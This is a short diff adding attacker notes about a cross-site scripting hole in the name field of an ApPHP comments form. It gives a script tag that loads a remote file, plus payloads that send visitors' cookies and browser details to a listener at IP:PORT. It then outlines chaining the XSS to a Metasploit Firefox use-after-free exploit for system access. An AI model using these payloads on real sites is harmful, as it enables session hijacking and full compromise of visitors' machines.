@@ -1,0 +1,16 @@
+ApPHP has an XSS vuln in their comments form, in the name field
+
+<script src="//IP/FILE.js"></script>
+  Simplest way to confirm an XSS vuln due to possible length restrictions-short is sweet.
+  
+In js file (with listener at IP:PORT)
+Return user's cookies:
+document.write("<img src=\"http://IP:PORT/cookie?stolen=\""+document.cookie+"\">")
+------
+Return user's user agent & version:
+
+document.write("<img src=\"http://IP:PORT/browser?this="+navigator.userAgent+navigator.appVersion+"\">")
+
+FireFox 38-41 hosts a publicly known UAF vuln (exploit(windows/browser/firefox_smil_uaf) in Metasploit)
+  this+windows OS=system access
+    use XSS to attach needed url as iframe
